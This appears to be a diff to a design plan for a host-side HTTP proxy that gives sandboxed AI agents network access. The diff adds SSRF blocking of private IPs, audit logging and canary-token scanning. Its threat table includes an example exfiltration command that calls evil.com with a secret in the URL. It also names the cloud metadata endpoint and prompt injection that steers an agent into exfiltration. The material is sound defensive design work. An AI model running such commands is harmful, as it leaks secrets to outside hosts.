@@ -19,7 +19,9 @@
 | K8s transport | Direct TCP to k8s Service | Pods already have networking (NATS). No sidecar proxy needed |
 | NATS-based proxying | Rejected | Overhead for large downloads, CONNECT tunneling complexity |
 | K8s sidecar proxy | Rejected | Unnecessary — pod can reach host Service directly via TCP |
-| Request filtering | None (for now) | Proxy is a controlled choke point. Filtering can be layered later |
+| Request filtering | Private IP blocking + opt-in | Block SSRF targets (cloud metadata, internal IPs). Proxy is opt-in per agent |
+| Audit logging | All requests logged | Method, URL, status, bytes — written to audit provider |
+| Outbound scanning | Canary token check on HTTP request bodies | Prevents canary exfiltration via proxy |
 | HTTPS handling | CONNECT tunneling | Standard HTTP proxy protocol — all clients support it natively |
 
 ---
@@ -90,6 +92,18 @@ interface WebProxy {
   stop: () => void;
 }
 
+interface ProxyAuditEntry {
+  action: 'proxy_request';
+  sessionId: string;
+  method: string;
+  url: string;
+  status: number;
+  requestBytes: number;
+  responseBytes: number;
+  durationMs: number;
+  blocked?: string;
+}
+
 /**
  * Start the HTTP forward proxy.
  * - Unix socket mode: for Docker/Apple containers (mounted into sandbox)
@@ -98,8 +112,12 @@ interface WebProxy {
 function startWebProxy(options: {
   /** Unix socket path OR TCP port number */
   listen: string | number;
-  /** Optional request logging callback */
-  onRequest?: (method: string, url: string) => void;
+  /** Session ID for audit logging context */
+  sessionId: string;
+  /** Canary token to scan for in outbound request bodies (from router) */
+  canaryToken?: string;
+  /** Audit log callback — wired to audit provider by host */
+  onAudit?: (entry: ProxyAuditEntry) => void;
 }): WebProxy;
 ```
 
@@ -107,9 +125,40 @@ function startWebProxy(options: {
 - HTTP requests: forward via `fetch()`, stream response back
 - CONNECT requests: `net.connect()` to target, pipe bidirectionally via `socket.pipe()`
 - No body size limit (streaming — never buffers full response)
-- No DNS pinning or SSRF filtering (proxy allows all outbound traffic)
-- Logging: method, URL, status code (no request/response bodies)
+- Private IP blocking: reject connections to `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.169.254` (cloud metadata), `::1`, `fe80::/10`, `fc00::/7` — reuse logic from `src/providers/web/fetch.ts`
+- Audit logging: every request logged with method, URL, target host, status code, bytes transferred, session ID
+- Outbound canary scanning: scan HTTP request bodies for canary tokens before forwarding (prevents exfiltration via POST/PUT)
 - Graceful shutdown: close server, drain active connections
+
+**Audit log entry structure:**
+```typescript
+interface ProxyAuditEntry {
+  action: 'proxy_request';
+  sessionId: string;
+  method: string;           // GET, POST, CONNECT
+  url: string;              // Full URL or host:port for CONNECT
+  status: number;           // Response status code
+  requestBytes: number;     // Outbound body size
+  responseBytes: number;    // Inbound body size
+  durationMs: number;       // Round-trip time
+  blocked?: string;         // Reason if blocked (private IP, canary detected)
+}
+```
+
+**Canary scanning on outbound requests:**
+For HTTP requests (non-CONNECT), the proxy has access to the request body before
+forwarding. It checks for canary token patterns (`CANARY-<32hex>`) using the
+same `scanner.checkCanary()` logic from the router. If a canary is detected,
+the request is blocked and an audit entry with `blocked: 'canary_detected'` is
+written. For CONNECT tunnels, the proxy cannot inspect the encrypted payload —
+this is an accepted limitation (canary scanning still works on the IPC path via
+`router.processOutbound()`).
+
+**Private IP blocking:**
+Before establishing outbound connections (both HTTP forward and CONNECT), the
+proxy resolves the target hostname and checks the IP against private ranges.
+This prevents SSRF attacks against cloud metadata endpoints, internal services,
+and localhost. Reuses `isPrivateIP()` from `src/providers/web/fetch.ts`.
 
 ### 2. TCP Bridge for Docker/Apple (`src/agent/web-proxy-bridge.ts`)
 
@@ -256,7 +305,7 @@ spec:
 
 | File | Action | Purpose |
 |------|--------|---------|
-| `src/host/web-proxy.ts` | **Create** | HTTP forward proxy (HTTP + CONNECT) |
+| `src/host/web-proxy.ts` | **Create** | HTTP forward proxy (HTTP + CONNECT) with private IP blocking, canary scanning, audit logging |
 | `src/agent/web-proxy-bridge.ts` | **Create** | TCP-to-Unix-socket bridge for Docker/Apple |
 | `src/host/server-completions.ts` | **Modify** | Start/stop web proxy per completion |
 | `src/host/host-process.ts` | **Modify** | Start web proxy on TCP for k8s |
@@ -276,24 +325,48 @@ spec:
 - Docker/Apple containers keep `--network=none` — no direct internet access
 - Credentials never enter containers — proxy runs on host
 - IPC unchanged — web proxy is a separate channel
-- All existing security controls (taint budget, canary tokens, scanners) unaffected
+- Canary tokens checked on outbound HTTP request bodies
+- Private IPs blocked — same SSRF protections as `web_fetch`
+- All requests audit-logged with session context
 
-**New attack surface:**
-- Agent can make arbitrary outbound HTTP/HTTPS requests through the proxy
-- This is intentional — agents need it for package installs, git operations, etc.
-- The proxy is a controlled choke point: all traffic flows through the host
+**New attack surface and mitigations:**
 
-**Mitigations available (not implemented in v1, can be added later):**
-- Domain allowlist/blocklist in proxy config
-- Rate limiting per session
-- Request/response logging for audit
-- Body size limits for downloads
-- Integration with taint budget (mark proxied responses as external)
+| Attack Vector | Risk | Mitigation |
+|---|---|---|
+| Data exfiltration via POST/PUT | Agent sends sensitive data to external server | Canary scanning on request bodies blocks canary leakage. Audit logging enables forensic detection of other exfiltration |
+| Data exfiltration via HTTPS CONNECT | Encrypted tunnel — proxy can't inspect | Accepted limitation. Canary scanning still works on IPC path (`router.processOutbound`). Audit logs capture target host:port |
+| Data exfiltration via URL params | `curl https://evil.com/?secret=...` | Audit logging captures full URL. Domain allowlist (future) would block |
+| SSRF against internal services | Agent probes `10.x.x.x`, `169.254.169.254` | Private IP blocking on all outbound connections (HTTP + CONNECT) |
+| Supply chain attacks | Malicious npm/pip packages | Out of scope for proxy — same risk as any dev machine. Sandbox isolation limits blast radius |
+| Prompt injection → proxy abuse | Injected prompt instructs agent to exfiltrate | Canary scanning catches canary leakage. Taint budget gates sensitive IPC actions. Audit trail for investigation |
+
+**Proxy is opt-in.** Disabled by default. Agents that need network access
+(package installs, git) explicitly enable it in config. This limits the attack
+surface to agents that genuinely need outbound HTTP access.
+
+**Taint budget interaction:**
+Proxy traffic does NOT feed into the taint budget. Rationale: proxy traffic
+(npm packages, git objects) is consumed by tools, not injected into the LLM
+conversation. If an agent reads a proxied file and passes it to the LLM, it
+enters the conversation through normal tool output, which is already
+taint-tracked. Counting raw proxy bytes would push every `npm install` over
+the taint threshold, making the proxy unusable.
+
+**Traffic volume tracking:**
+The proxy tracks total bytes per session (request + response). This is reported
+as an audit metric, not a taint signal. Anomalous volume (e.g., 500MB in a
+single session) can trigger alerts without blocking normal workflows.
 
 **K8s network policy:**
-- Sandbox pods gain one additional egress target (host proxy service)
+- Sandbox pods gain one additional egress target (host proxy service on port 3128)
 - No direct internet access from sandbox pods — proxy mediates all outbound
 - Proxy runs in the trusted host pod, same security boundary as LLM proxy
+
+**Future mitigations (not in v1):**
+- Domain allowlist/blocklist in proxy config
+- Rate limiting per session
+- Per-domain byte quotas
+- TLS interception for CONNECT scanning (requires CA cert injection — complex)
 
 ---
 
@@ -307,13 +380,19 @@ Build the core forward proxy with:
 1. `http.createServer()` for HTTP request forwarding
 2. `server.on('connect', ...)` for HTTPS CONNECT tunneling
 3. Support both Unix socket and TCP listeners
-4. Streaming responses (never buffer full body)
-5. Logging callback for observability
-6. Graceful shutdown
+4. Private IP blocking — reuse `isPrivateIP()` from `src/providers/web/fetch.ts` (extract to shared util if needed). Check resolved IP before connecting, for both HTTP forwarding and CONNECT tunneling
+5. Outbound canary scanning — for HTTP requests (non-CONNECT), scan request body for canary token patterns before forwarding. Block and audit if detected
+6. Audit logging — emit structured log entries (method, URL, status, bytes, duration, sessionId, blocked reason) via callback. Host wires this to the audit provider
+7. Traffic volume tracking — count request/response bytes per session
+8. Streaming responses (never buffer full response body; canary scan only checks request bodies, which are typically small)
+9. Graceful shutdown: close server, drain active connections
 
 **Tests:**
 - HTTP GET/POST forwarding through proxy
 - HTTPS CONNECT tunneling (verify bytes pass through)
+- Private IP blocking (127.0.0.1, 10.x, 169.254.169.254, etc.)
+- Canary token detection in request body → request blocked
+- Audit log entries emitted for each request
 - Unix socket listener mode
 - TCP listener mode
 - Connection cleanup on close
